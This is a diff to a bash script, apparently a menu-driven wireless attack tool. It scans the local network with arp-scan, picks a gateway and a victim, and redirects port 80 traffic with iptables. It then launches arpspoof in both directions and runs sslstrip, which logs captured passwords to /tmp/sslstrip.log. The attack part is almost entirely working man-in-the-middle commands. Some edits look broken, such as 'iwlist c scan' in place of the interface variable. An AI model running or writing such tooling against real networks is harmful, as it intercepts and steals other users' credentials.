@@ -14,7 +14,7 @@ primary_interface() {
 		count=$(( count+2 ))
 	done
 	current_interface=$( whiptail --menu "Select your interface:" 25 50 7 \
-			"${available_interface[@]}" 3>&2 2>&1 1>&3- )
+			"${available_interface[@]}" 3>&2 2>&1 1>&3-)
 }
 
 monitor_cleanup(){
@@ -29,21 +29,19 @@ auto_map(){
 	echo "Please wait. Scanning..."
 	count=0
 	targetIPs=()
-	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
+	for i in $(arp-scan --interface $current_interface $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}') | sed -e 's/ /./g' | sed -e 's/\s/___/g' | grep -v "datalink" | grep -v "arp-scan" | grep -v "received")
 	do
+		(( count+= 1 ))
 		targetIPs[$count]="$i"
-		count=$(( $count + 2 ))
+		(( count+= 1 ))
+		targetIPs[$count]=" "
 	done
-	count=1
-	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "MAC" | awk '{print $3 $4}' | sed -e 's/ /_/g' )
-	do 
-		targetIPs[$count]="$i"
-		count=$(( $count+2 ))
-	done
-	#3>&2 2&1 1>&3- is needed to make the whiptail UI appear.
-	CURRENT_TARGET=$(route -n | awk -F' ' '{print $2}' | grep -v -E "Gateway|IP|0.0.0.0")
+	echo $targetIPs[1];
+	#3>&2 2&1 1>&3- is needed to make the whiptail GUI appear.
+	CURRENT_GATEWAY=$(route -n | awk -F' ' '{print $2}' | grep -v -E "Gateway|IP|0.0.0.0")
 	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 25 50 7 \
 			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+	CURRENT_TARGET2=$(echo $CURRENT_TARGET2 | awk 'BEGIN { FS = "___" } ; { print $1 }')
 }
 
 AVAILABLEAP=()
@@ -52,7 +50,7 @@ TARGETAP=""
 Nearby_Mac(){
 	AvailableAP=()
 	count=0
-	for i in $( iwlist $current_interface scan | grep 'Address' | awk -F' ' '{print $5}' )
+	for i in $( iwlist c scan | grep 'Address' | awk -F' ' '{print $5}' )
 	do
 		AvailableAP[$count]="$i"
 		count=$(( $count + 2 ))
@@ -71,7 +69,7 @@ Nearby_Mac(){
 while [ exit != 2 ]; do
 	#Functions and variables
 	
-	CURRENT_TARGET=""
+	CURRENT_GATEWAY=""
 	CURRENT_TARGET2=""
 	
 	
@@ -171,14 +169,22 @@ while [ exit != 2 ]; do
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 		
 		#launches arpspoof impersonating the host and the client
-		xterm -e arpspoof -i $current_interface -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
-		xterm -e arpspoof -i $current_interface -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
+		ARPSPOOFHOST=$CURRENT_GATEWAY
+		ARPSPOOFCLIENT=$CURRENT_TARGET2
+		echo $ARPSPOOFHOST
+		echo $ARPSPOOFCLIENT
+		gnome-terminal -e "arpspoof -i $current_interface -t $CURRENT_GATEWAY $CURRENT_TARGET2" &
+
+		gnome-terminal -e "arpspoof -i $current_interface -t $CURRENT_TARGET2 $CURRENT_GATEWAY" &
 		
 		#launches sslstrip Passwords will be displayed on screen and logged in sslstrip.log (may wish to add some kind of time stamping in the name... Oh well)
-		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.$(date | sed -e 's/ /_/g').log 
+		gnome-terminal -e "sslstrip -k -l 8080 -w /tmp/sslstrip.log" &
+		tail -F /tmp/sslstrip.log
 	
 		echo "Press enter to terminate..."
 		read enter
+		echo 0 > /proc/sys/net/ipv4/ip_forward
+		iptables --flush
 		killall arpspoof
 	;;
 	
